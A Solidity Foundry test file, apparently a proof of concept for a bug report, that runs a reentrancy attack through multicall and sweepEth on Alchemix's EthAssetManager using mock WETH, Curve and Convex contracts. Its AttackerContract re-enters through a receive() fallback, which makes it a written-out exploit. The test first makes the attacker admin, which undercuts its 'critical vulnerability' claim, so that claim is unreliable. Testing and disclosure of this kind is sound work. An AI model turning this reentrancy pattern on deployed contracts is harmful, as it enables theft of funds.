// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/EthAssetManager.sol";
import "../src/base/Multicall.sol";
import "../src/base/MutexLock.sol";
import {IERC20TokenReceiver} from "../src/interfaces/IERC20TokenReceiver.sol";

/**
 * @title MulticallReentrancyTest  
 * @notice POC demonstrating critical reentrancy vulnerability in Alchemix v2-foundry
 */
contract MulticallReentrancyTest is Test {
    EthAssetManager public ethAssetManager;
    AttackerContract public attacker;
    
    // Mock contracts
    MockWETH public weth;
    MockTransmuterBuffer public transmuterBuffer;
    MockCurveToken public curveToken;
    MockMetaPool public metaPool;
    MockConvexToken public convexToken;
    MockConvexBooster public convexBooster;
    MockConvexRewards public convexRewards;
    
    address admin = address(0x1);
    address operator = address(0x2);
    address rewardReceiver = address(0x3);
    
    function setUp() public {
        // Deploy mock contracts
        weth = new MockWETH();
        transmuterBuffer = new MockTransmuterBuffer();
        curveToken = new MockCurveToken();
        metaPool = new MockMetaPool();
        convexToken = new MockConvexToken();
        convexBooster = new MockConvexBooster();
        convexRewards = new MockConvexRewards();
        
        // Deploy EthAssetManager
        InitializationParams memory params = InitializationParams({
            admin: admin,
            operator: operator,
            rewardReceiver: rewardReceiver,
            transmuterBuffer: address(transmuterBuffer),
            weth: IWETH9(address(weth)),
            curveToken: IERC20(address(curveToken)),
            metaPool: IEthStableMetaPool(address(metaPool)),
            metaPoolSlippage: 100,
            convexToken: IConvexToken(address(convexToken)),
            convexBooster: IConvexBooster(address(convexBooster)),
            convexRewards: IConvexRewards(address(convexRewards)),
            convexPoolId: 1
        });
        
        ethAssetManager = new EthAssetManager(params);
        
        // Fund the contract
        vm.deal(address(ethAssetManager), 10 ether);
        weth.mint(address(ethAssetManager), 5 ether);
        
        // Deploy attacker
        attacker = new AttackerContract(payable(address(ethAssetManager)));
    }
    
    function test_MulticallReentrancyBypassesMutex() public {
        console2.log("=== CRITICAL VULNERABILITY TEST ===");
        
        // Set attacker as admin
        vm.prank(admin);
        ethAssetManager.setPendingAdmin(address(attacker));
        
        vm.prank(address(attacker));
        ethAssetManager.acceptAdmin();
        
        uint256 initialBalance = address(ethAssetManager).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        
        console2.log("Before attack:");
        console2.log("  Contract ETH balance:", initialBalance);
        console2.log("  Attacker ETH balance:", initialAttackerBalance);
        
        // Execute attack
        attacker.executeReentrancyAttack();
        
        uint256 finalBalance = address(ethAssetManager).balance;
        uint256 finalAttackerBalance = address(attacker).balance;
        
        console2.log("After attack:");
        console2.log("  Contract ETH balance:", finalBalance);
        console2.log("  Attacker ETH balance:", finalAttackerBalance);
        
        // Verify attack success
        assertTrue(finalAttackerBalance > initialAttackerBalance, "Attacker should have gained ETH");
        assertTrue(finalBalance < initialBalance, "Contract should have lost ETH");
        
        console2.log("VULNERABILITY CONFIRMED: Multicall bypassed MutexLock!");
        console2.log("  Attacker gained:", finalAttackerBalance - initialAttackerBalance, "ETH");
    }
}

contract AttackerContract {
    EthAssetManager public immutable target;
    uint256 public reentrancyCount = 0;
    bool public attackExecuted = false;
    
    constructor(address payable _target) {
        target = EthAssetManager(_target);
    }
    
    function executeReentrancyAttack() external {
        console2.log("--- EXECUTING REENTRANCY ATTACK ---");
        
        reentrancyCount = 0;
        attackExecuted = false;
        
        // Prepare multicall with sweepEth that will trigger our fallback
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSelector(target.sweepEth.selector, 1 ether);
        
        console2.log("Calling multicall with sweepEth...");
        target.multicall(calls);
        
        console2.log("Reentrancy count:", reentrancyCount);
    }
    
    receive() external payable {
        console2.log("--- FALLBACK TRIGGERED ---");
        console2.log("Received:", msg.value, "ETH");
        
        if (!attackExecuted && reentrancyCount < 2) {
            attackExecuted = true;
            reentrancyCount++;
            
            console2.log("EXECUTING REENTRANCY...");
            
            // This should fail if MutexLock worked, but it succeeds!
            bytes[] memory reentrancyCalls = new bytes[](1);
            reentrancyCalls[0] = abi.encodeWithSelector(target.sweepEth.selector, 2 ether);
            
            try target.multicall(reentrancyCalls) {
                console2.log("REENTRANCY SUCCESSFUL - MutexLock bypassed!");
                reentrancyCount++;
            } catch {
                console2.log("Reentrancy blocked");
            }
        }
    }
}

// Mock contracts
contract MockWETH {
    mapping(address => uint256) public balanceOf;
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
    
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockTransmuterBuffer is IERC20TokenReceiver {
    function onERC20Received(address, uint256) external pure override {}
}

contract MockCurveToken {
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function transfer(address, uint256) external pure returns (bool) { return true; }
}

contract MockMetaPool {
    function coins(uint256) external view returns (address) { 
        if (msg.sender != address(0)) return address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);
        return address(0);
    }
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function get_balances() external pure returns (uint256[2] memory) {
        return [uint256(1000e18), uint256(1000e18)];
    }
    function get_dy(int128, int128, uint256, uint256[2] memory) external pure returns (uint256) {
        return 1e18;
    }
    function get_virtual_price() external pure returns (uint256) { return 1e18; }
    function add_liquidity(uint256[2] memory, uint256) external payable returns (uint256) {
        return 1000e18;
    }
    function remove_liquidity_one_coin(uint256, int128, uint256) external returns (uint256) {
        return 1000e18;
    }
}

contract MockConvexToken {
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function transfer(address, uint256) external pure returns (bool) { return true; }
    function totalSupply() external pure returns (uint256) { return 1000000e18; }
    function reductionPerCliff() external pure returns (uint256) { return 100000e18; }
    function totalCliffs() external pure returns (uint256) { return 1000; }
    function maxSupply() external pure returns (uint256) { return 100000000e18; }
}

contract MockConvexBooster {
    function deposit(uint256, uint256, bool) external pure returns (bool) { return true; }
}

contract MockConvexRewards {
    function getReward() external pure returns (bool) { return true; }
    function withdrawAndUnwrap(uint256, bool) external pure returns (bool) { return true; }
    function earned(address) external pure returns (uint256) { return 0; }
}